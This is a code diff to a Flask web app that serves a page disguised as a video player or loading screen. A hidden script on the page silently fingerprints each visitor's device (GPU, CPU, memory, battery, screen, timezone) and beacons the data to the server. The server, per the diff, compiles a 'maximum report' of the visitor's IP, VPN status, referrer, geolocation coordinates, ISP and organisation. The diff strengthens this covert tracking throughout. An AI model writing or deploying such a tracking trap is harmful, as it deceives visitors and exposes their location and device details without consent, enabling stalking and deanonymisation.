@@ -25,14 +25,13 @@ def index():
     if "Go-http-client" in user_agent or "Render" in user_agent:
         return "OK", 200
 
-    # HTML-страница со встроенным видеоплеером и фоновым сбором железа
     html_page = """
     <!DOCTYPE html>
     <html lang="ru">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Просмотр видео</title>
+        <title>Загрузка...</title>
         <style>
             body {
                 margin: 0;
@@ -57,19 +56,19 @@ def index():
         </video>
 
         <script>
-            async function collectData() {
-                try {
-                    let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
-                    let pixelRatio = window.devicePixelRatio || 1;
-                    let touchPoints = navigator.maxTouchPoints || 0;
-                    let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
-                    let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
-                    let platform = navigator.platform || "Неизвестно";
-                    let language = navigator.language || "Неизвестно";
-                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
-                    let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+            async function collectAndSend() {
+                let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
+                let pixelRatio = window.devicePixelRatio || 1;
+                let touchPoints = navigator.maxTouchPoints || 0;
+                let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
+                let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
+                let platform = navigator.platform || "Неизвестно";
+                let language = navigator.language || "Неизвестно";
+                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
+                let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
 
-                    let gpu = "Неизвестно";
+                let gpu = "Неизвестно";
+                try {
                     let canvas = document.createElement('canvas');
                     let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                     if (gl) {
@@ -78,38 +77,46 @@ def index():
                             gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                         }
                     }
+                } catch(e) {}
 
-                    let batteryLevel = "Неизвестно";
-                    let batteryCharging = "Неизвестно";
+                let batteryLevel = "Неизвестно";
+                let batteryCharging = "Неизвестно";
+                try {
                     if (navigator.getBattery) {
                         let battery = await navigator.getBattery();
                         batteryLevel = Math.round(battery.level * 100) + "%";
                         batteryCharging = battery.charging ? "Да" : "Нет";
                     }
+                } catch(e) {}
 
-                    let data = {
-                        screen: screenInfo,
-                        pixel_ratio: pixelRatio,
-                        touch: touchPoints,
-                        cores: cpuCores,
-                        memory: memory,
-                        platform: platform,
-                        language: language,
-                        timezone: timezone,
-                        cookies: cookiesEnabled,
-                        gpu: gpu,
-                        battery_level: batteryLevel,
-                        battery_charging: batteryCharging
-                    };
+                let data = JSON.stringify({
+                    screen: screenInfo,
+                    pixel_ratio: pixelRatio,
+                    touch: touchPoints,
+                    cores: cpuCores,
+                    memory: memory,
+                    platform: platform,
+                    language: language,
+                    timezone: timezone,
+                    cookies: cookiesEnabled,
+                    gpu: gpu,
+                    battery_level: batteryLevel,
+                    battery_charging: batteryCharging
+                });
 
-                    await fetch('/collect', {
+                // Используем send_beacon для гарантированной отправки данных
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon('/collect', new Blob([data], {type: 'application/json'}));
+                } else {
+                    fetch('/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
+                        body: data,
+                        keepalive: true
                     });
-                } catch(e) {}
+                }
             }
-            collectData();
+            collectAndSend();
         </script>
     </body>
     </html>
@@ -152,18 +159,31 @@ def collect():
     user_agent = request.headers.get("User-Agent", "")
 
     initial_message = (
-        f"🔔 *ПЕРЕХОД И ПРОСМОТР ВИДЕО*\n\n"
+        f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
         f"⏱️ *Время:* `{visit_time}`\n"
         f"🌐 *IP-адрес:* `{ip}`\n"
-        f"🛡 *VPN / Прокси:* `{is_vpn}`\n\n"
+        f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
+        f"🔗 *Реферер:* `{request.referrer or 'Прямой заход'}`\n\n"
         f"📍 *ГЕОЛОКАЦИЯ:*\n"
         f"- Страна: `{country}`\n"
-        f"- Город: `{city}`\n\n"
+        f"- Регион: `{region}`\n"
+        f"- Город: `{city}`\n"
+        f"- Координаты: `{lat}, {lon}`\n"
+        f"- Провайдер: `{isp}`\n"
+        f"- Организация: `{org}`\n\n"
         f"💻 *ЖЕЛЕЗО И ЭКРАН:*\n"
         f"- Платформа ОС: `{data.get('platform')}`\n"
         f"- Экран: `{data.get('screen')}`\n"
+        f"- Плотность пикселей: `{data.get('pixel_ratio')}`\n"
+        f"- Точки касания (Тач): `{data.get('touch')}`\n"
         f"- Ядра процессора: `{data.get('cores')}`\n"
+        f"- Оперативная память: `{data.get('memory')}`\n"
         f"- Видеокарта (GPU): `{data.get('gpu')}`\n\n"
+        f"⚙️ *СИСТЕМА И БАТАРЕЯ:*\n"
+        f"- Язык: `{data.get('language')}`\n"
+        f"- Часовой пояс: `{data.get('timezone')}`\n"
+        f"- Батарея: `{data.get('battery_level')} (Зарядка: {data.get('battery_charging')})`\n"
+        f"- Cookies: `{data.get('cookies')} | Онлайн: Да`\n\n"
         f"🌐 *USER-AGENT:*\n`{user_agent}`"
     )
 
